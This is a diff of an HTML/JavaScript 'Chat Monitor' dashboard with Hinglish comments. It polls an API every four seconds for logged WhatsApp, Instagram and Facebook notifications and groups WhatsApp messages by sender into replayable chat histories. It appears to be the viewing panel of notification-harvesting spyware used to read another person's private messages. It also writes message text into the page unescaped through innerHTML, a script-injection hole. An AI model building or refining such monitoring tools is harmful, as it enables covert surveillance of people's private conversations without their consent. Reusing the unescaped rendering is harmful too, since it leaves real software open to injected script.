@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat Monitor</title>
+    <title>Ultimate Chat Monitor</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -46,9 +46,7 @@
             z-index: 10;
         }
 
-        .header-top {
-            display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;
-        }
+        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
         .title { font-size: 20px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
 
         /* Chips */
@@ -94,40 +92,37 @@
             padding: 2px 6px; border-radius: 10px; margin-left: 5px;
         }
 
-        /* --- POPUP CHAT --- */
-        .chat-overlay {
+        /* --- FULL SCREEN CHAT (WhatsApp Style) --- */
+        .chat-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 100; display: none;
+            background: #0b141a; z-index: 100; display: none;
             flex-direction: column;
             animation: slideIn 0.2s ease-out;
         }
         @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
 
         .chat-header {
-            padding: 15px; background: #202c33; display: flex; align-items: center; gap: 15px;
-            border-bottom: 1px solid #333;
+            padding: 10px 15px; background: #202c33; display: flex; align-items: center; gap: 15px;
+            border-bottom: 1px solid #333; height: 60px;
         }
-        .back-btn { font-size: 20px; cursor: pointer; color: #bbb; }
-        .chat-title { font-size: 18px; font-weight: 600; color: #fff; }
-
+        .chat-back { font-size: 20px; color: #fff; cursor: pointer; }
+        .chat-name { font-size: 18px; font-weight: 600; color: #fff; }
+        
         .chat-body {
             flex: 1; overflow-y: auto; padding: 15px;
-            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); /* Dark WhatsApp BG */
+            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); /* WhatsApp Dark BG */
             background-size: cover;
-            display: flex; flex-direction: column; gap: 10px;
+            display: flex; flex-direction: column; gap: 8px;
         }
 
-        .chat-bubble {
-            background: #202c33; color: #e9edef;
-            padding: 8px 12px; border-radius: 8px;
-            max-width: 80%; align-self: flex-start;
-            font-size: 14px; line-height: 1.4;
-            position: relative;
-            box-shadow: 0 1px 1px rgba(0,0,0,0.2);
+        .bubble {
+            max-width: 80%; padding: 8px 10px; border-radius: 8px;
+            font-size: 14px; line-height: 1.4; color: #e9edef;
+            position: relative; align-self: flex-start;
+            background: #202c33; box-shadow: 0 1px 1px rgba(0,0,0,0.2);
         }
-        
-        .chat-time {
-            font-size: 10px; color: #8696a0; text-align: right; margin-top: 4px; display: block;
+        .bubble-time {
+            font-size: 10px; color: #8696a0; text-align: right; display: block; margin-top: 4px;
         }
 
     </style>
@@ -138,11 +133,11 @@
         
         <div class="header">
             <div class="header-top">
-                <div class="title"><i class="fas fa-eye"></i> Monitor</div>
+                <div class="title"><i class="fas fa-eye"></i> Monitor Pro</div>
                 <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer; color:var(--accent);"></i>
             </div>
             <div class="filters-scroll">
-                <div class="chip active" onclick="setFilter('all', this)">All Logs</div>
+                <div class="chip active" onclick="setFilter('all', this)">All (Raw)</div>
                 <div class="chip" onclick="setFilter('whatsapp', this)">WhatsApp (Chat)</div>
                 <div class="chip" onclick="setFilter('instagram', this)">Instagram</div>
             </div>
@@ -154,13 +149,13 @@
 
     </div>
 
-    <div class="chat-overlay" id="chatScreen">
+    <div class="chat-screen" id="chatView">
         <div class="chat-header">
-            <i class="fas fa-arrow-left back-btn" onclick="closeChat()"></i>
+            <i class="fas fa-arrow-left chat-back" onclick="closeChat()"></i>
             <div class="avatar wa" style="width:35px; height:35px; font-size:14px;"><i class="fab fa-whatsapp"></i></div>
-            <div class="chat-title" id="chatTitle">Sender Name</div>
+            <div class="chat-name" id="chatTitle">Name</div>
         </div>
-        <div class="chat-body" id="chatMessages">
+        <div class="chat-body" id="chatContent">
             </div>
     </div>
 
@@ -177,7 +172,7 @@
             try {
                 const res = await fetch(API_URL);
                 const rawData = await res.json();
-                // Sort by time (Newest first)
+                // Sort Newest First
                 allData = rawData.sort((a, b) => b.postTime - a.postTime);
                 renderUI();
             } catch (e) { console.error(e); }
@@ -187,54 +182,48 @@
             const container = document.getElementById('mainList');
             container.innerHTML = "";
 
+            // --- LOGIC 1: WHATSAPP TAB (GROUPED) ---
             if (currentFilter === 'whatsapp') {
-                renderGroupedView(container);
-            } else {
-                renderFlatView(container);
+                
+                // 1. WhatsApp ka data nikalo
+                const waData = allData.filter(d => (d.packageName||"").includes('whatsapp'));
+                
+                // 2. Group banao Name ke hisaab se
+                const groups = {};
+                waData.forEach(msg => {
+                    const name = msg.title || "Unknown";
+                    if (!groups[name]) groups[name] = [];
+                    groups[name].push(msg);
+                });
+
+                // 3. Har Group (Person) ka ek Card banao
+                Object.keys(groups).forEach(name => {
+                    const messages = groups[name]; // Saare messages is bande ke
+                    const latestMsg = messages[0]; // Sabse naya message
+                    
+                    const card = createCard(latestMsg, true, messages.length);
+                    
+                    // Click karne par CHAT history khulegi
+                    card.onclick = () => openChat(name, messages);
+                    container.appendChild(card);
+                });
+
+                if(waData.length === 0) container.innerHTML = "<div style='text-align:center; color:#555; margin-top:20px;'>No WhatsApp chats found.</div>";
+
+            } 
+            // --- LOGIC 2: ALL TAB (SINGLE / RAW) ---
+            else {
+                let data = allData;
+                if (currentFilter !== 'all') {
+                    data = allData.filter(d => (d.appName||"").toLowerCase().includes(currentFilter));
+                }
+
+                data.forEach(item => {
+                    // Yahan Grouping nahi hogi. Sab line se aayega.
+                    const card = createCard(item, false);
+                    container.appendChild(card);
+                });
             }
-        }
-
-        // --- MODE 1: FLAT VIEW (For "All" & "Instagram") ---
-        function renderFlatView(container) {
-            let data = allData;
-            if (currentFilter !== 'all') {
-                data = allData.filter(d => (d.appName||"").toLowerCase().includes(currentFilter));
-            }
-
-            data.forEach(item => {
-                const card = createCard(item, false);
-                // Flat view me click karne par simple alert ya chota popup dikha sakte hain
-                // but abhi ke liye hum sirf WhatsApp me chat feature de rahe hain
-                container.appendChild(card);
-            });
-        }
-
-        // --- MODE 2: GROUPED VIEW (Only for WhatsApp) ---
-        function renderGroupedView(container) {
-            // 1. Filter only WhatsApp
-            const waData = allData.filter(d => (d.appName||"").toLowerCase().includes('whatsapp'));
-
-            // 2. Group by Title (Sender Name)
-            const groups = {};
-            waData.forEach(msg => {
-                const name = msg.title || "Unknown";
-                if (!groups[name]) groups[name] = [];
-                groups[name].push(msg);
-            });
-
-            // 3. Render one card per Group
-            Object.keys(groups).forEach(name => {
-                const messages = groups[name]; // Array of all messages from this person
-                const latestMsg = messages[0]; // Newest message (because sorted)
-                
-                // Create Card
-                const card = createCard(latestMsg, true, messages.length);
-                
-                // CLICK EVENT -> Open Full Chat History
-                card.onclick = () => openChat(name, messages);
-                
-                container.appendChild(card);
-            });
         }
 
         function createCard(item, isGrouped, count = 0) {
@@ -242,17 +231,16 @@
             div.className = 'notif-card';
             
             let iconClass = 'fas fa-bell';
-            let iconBg = 'style="background:#333"';
+            let iconBg = 'class="avatar"';
             const pkg = (item.packageName || "").toLowerCase();
             
             if (pkg.includes('whatsapp')) { iconClass = 'fab fa-whatsapp'; iconBg = 'class="avatar wa"'; }
             else if (pkg.includes('instagram')) { iconClass = 'fab fa-instagram'; iconBg = 'class="avatar insta"'; }
             else if (pkg.includes('facebook')) { iconClass = 'fab fa-facebook-f'; iconBg = 'class="avatar fb"'; }
-            else { iconBg = 'class="avatar"'; }
 
             const timeStr = new Date(parseInt(item.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
             
-            // Agar grouped hai to badge dikhao count ka
+            // Badge sirf tab dikhega jab Grouped view ho (WhatsApp tab)
             const badgeHtml = (isGrouped && count > 1) ? `<span class="badge">${count}</span>` : '';
 
             div.innerHTML = `
@@ -268,35 +256,33 @@
             return div;
         }
 
-        // --- CHAT SCREEN LOGIC ---
+        // --- REAL CHAT VIEW FUNCTION ---
         function openChat(name, messages) {
-            const screen = document.getElementById('chatScreen');
-            const body = document.getElementById('chatMessages');
+            const screen = document.getElementById('chatView');
+            const body = document.getElementById('chatContent');
             document.getElementById('chatTitle').innerText = name;
             
-            body.innerHTML = ""; // Clear old
+            body.innerHTML = ""; // Purana saaf karo
 
-            // Messages are Newest -> Oldest. Reverse them for chat view (Oldest Top)
+            // Messages array newest pehle hai, hume chat me oldest upar chahiye
+            // Isliye reverse karenge display ke liye
             const chatHistory = [...messages].reverse();
 
             chatHistory.forEach(msg => {
-                const bubble = document.createElement('div');
-                bubble.className = 'chat-bubble';
+                const div = document.createElement('div');
+                div.className = 'bubble';
                 const t = new Date(parseInt(msg.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
-                bubble.innerHTML = `${msg.text} <span class="chat-time">${t}</span>`;
-                body.appendChild(bubble);
+                div.innerHTML = `${msg.text} <span class="bubble-time">${t}</span>`;
+                body.appendChild(div);
             });
 
             screen.style.display = 'flex';
-            
-            // Auto scroll to bottom
-            setTimeout(() => {
-                body.scrollTop = body.scrollHeight;
-            }, 100);
+            // Scroll to bottom (latest message)
+            setTimeout(() => { body.scrollTop = body.scrollHeight; }, 100);
         }
 
         function closeChat() {
-            document.getElementById('chatScreen').style.display = 'none';
+            document.getElementById('chatView').style.display = 'none';
         }
 
         function setFilter(type, btn) {
@@ -306,9 +292,8 @@
             renderUI();
         }
 
-        // Auto Refresh
         fetchData();
-        setInterval(fetchData, 4000);
+        setInterval(fetchData, 4000); // Har 4 second me auto update
 
     </script>
 </body>
